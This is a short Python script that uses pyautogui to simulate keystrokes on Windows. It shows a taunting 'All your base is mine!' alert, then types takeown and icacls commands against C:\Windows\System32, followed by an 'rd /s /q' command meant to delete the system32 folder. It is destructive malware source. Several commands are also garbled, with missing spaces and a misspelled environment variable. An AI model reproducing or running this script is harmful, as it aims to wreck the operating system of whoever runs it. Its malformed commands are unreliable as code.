import pyautogui as pg

pg.alert("All your base is mine!")

pg.hotkey("Winleft")

pg.typewrite("command prompt\n", 0.1)

pg.typewrite("takeown/fC:\Windows\System32\n", 0.01)

pg.typewrite("IcaclsC:\Windows\System32\n", 0.01)

pg.hotkey("Win", "R")

pg.typewrite("cmd/crd/s/q%windr%\system32\n", 0.01)
